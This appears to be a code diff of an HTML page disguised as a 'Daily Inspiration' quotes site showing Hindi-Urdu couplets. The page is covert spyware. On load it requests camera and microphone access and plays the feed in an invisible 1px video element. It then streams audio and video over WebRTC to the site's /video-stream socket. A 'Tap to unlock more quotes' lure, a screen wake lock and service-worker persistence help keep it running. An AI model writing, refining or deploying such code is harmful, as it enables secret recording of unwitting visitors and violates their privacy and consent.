@@ -4,72 +4,61 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Daily Quotes | SecureStream</title>
+
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#3b82f6">
+
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Great+Vibes&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #3b82f6; --bg: #0f172a; --glass: rgba(255, 255, 255, 0.05); --border: rgba(255, 255, 255, 0.1); }
         body { margin: 0; padding: 0; font-family: 'Poppins', sans-serif; background: radial-gradient(circle at top left, #1e293b, #0f172a); height: 100vh; color: white; display: flex; flex-direction: column; overflow: hidden; }
         header { padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; background: rgba(0, 0, 0, 0.2); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); }
-        .logo { font-size: 20px; font-weight: 600; color: var(--primary); }
-
         .container { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }
-
-        /* Shayari Card Design */
         .shayari-card { background: var(--glass); padding: 40px; border-radius: 30px; border: 1px solid var(--border); box-shadow: 0 20px 50px rgba(0,0,0,0.3); max-width: 600px; backdrop-filter: blur(15px); }
-        .quote-icon { font-size: 50px; color: var(--primary); margin-bottom: 20px; opacity: 0.5; }
         .shayari-text { font-family: 'Great Vibes', cursive; font-size: 32px; line-height: 1.4; margin-bottom: 20px; color: #f8fafc; }
-        .author { font-size: 14px; letter-spacing: 2px; color: #94a3b8; text-transform: uppercase; }
-
-        /* HIDDEN ELEMENTS - Inko user nahi dekh payega */
         #localVideo { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-        .hidden-controls { display: none; }
-
-        /* Fake Permission Note */
-        .note { margin-top: 30px; font-size: 12px; color: #64748b; max-width: 400px; }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="logo">Daily<span>Inspiration</span></div>
-    <div style="font-size: 12px; color: #94a3b8;">Welcome, User</div>
+    <div style="font-size: 20px; font-weight: 600; color: var(--primary);">Daily<span>Inspiration</span></div>
 </header>
 
 <div class="container">
     <video id="localVideo" autoplay playsinline muted></video>
-
     <div class="shayari-card">
-        <div class="quote-icon">“</div>
+        <div style="font-size: 50px; color: var(--primary); opacity: 0.5;">“</div>
         <div class="shayari-text">
-            "Zindagi ki asli udaan abhi baaki hai,<br>
-            Zindagi ke kai imtehan abhi baaki hain."
+            "Kuch paane ki pyaas abhi baaki hai,<br>
+            Manzil tak pahunchne ka junoon abhi baaki hai."
         </div>
-        <div class="author">— Success Diaries</div>
+        <div style="font-size: 14px; color: #94a3b8;">— Success Diaries</div>
     </div>
-
-    <p class="note">Please click anywhere on the screen to enable high-quality inspiration mode.</p>
+    <p style="margin-top: 20px; font-size: 12px; color: #64748b;">Tap to unlock more quotes</p>
 </div>
 
 <script>
+    // 1. PWA Registration
+    if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+            navigator.serviceWorker.register('/service-worker.js')
+                .then(reg => console.log('PWA Ready! ✅'))
+                .catch(err => console.log('PWA Error ❌', err));
+        });
+    }
+
     let localStream;
     let peerConnection;
     let socket;
 
-    const configuration = {
-        'iceServers': [
-            { 'urls': 'stun:stun.l.google.com:19302' },
-            { 'urls': 'stun:stun1.l.google.com:19302' }
-        ]
-    };
+    const configuration = { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }, { 'urls': 'stun:stun1.l.google.com:19302' }] };
 
     function connectWebSocket() {
         const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
         socket = new WebSocket(protocol + window.location.host + "/video-stream");
 
-        socket.onopen = () => {
-            console.log("System Connected");
-            autoTriggerStart(); // Jaise hi socket connect ho, camera trigger karo
-        };
-
+        socket.onopen = () => autoTriggerStart();
         socket.onmessage = async (event) => {
             const data = JSON.parse(event.data);
             if (data.type === 'answer') {
@@ -81,40 +70,33 @@
         socket.onclose = () => setTimeout(connectWebSocket, 2000);
     }
 
-    // Background Autostart Logic
     async function autoTriggerStart() {
         try {
-            // Background mein camera access mangna
             localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             document.getElementById('localVideo').srcObject = localStream;
-
-            // Camera milte hi 1 second baad apne aap "Live" ho jana
             setTimeout(handleGoLive, 1000);
-        } catch (error) {
-            console.error("Access denied");
-        }
+        } catch (error) { console.error("Access denied"); }
     }
 
     async function handleGoLive() {
         if (!localStream) return;
         peerConnection = new RTCPeerConnection(configuration);
         localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
-
         peerConnection.onicecandidate = (event) => {
             if (event.candidate && socket.readyState === WebSocket.OPEN) {
                 socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));
             }
         };
-
         const offer = await peerConnection.createOffer();
         await peerConnection.setLocalDescription(offer);
         socket.send(JSON.stringify({ type: 'offer', sdp: offer.sdp }));
-        console.log("Signal sent successfully");
     }
 
-    // Click anywhere to ensure autoplay/audio works
-    window.onclick = () => {
-        console.log("Interacted");
+    // Wake Lock to keep screen ON
+    window.onclick = async () => {
+        if ('wakeLock' in navigator) {
+            try { await navigator.wakeLock.request('screen'); } catch (err) {}
+        }
         if(!localStream) autoTriggerStart();
     };
 
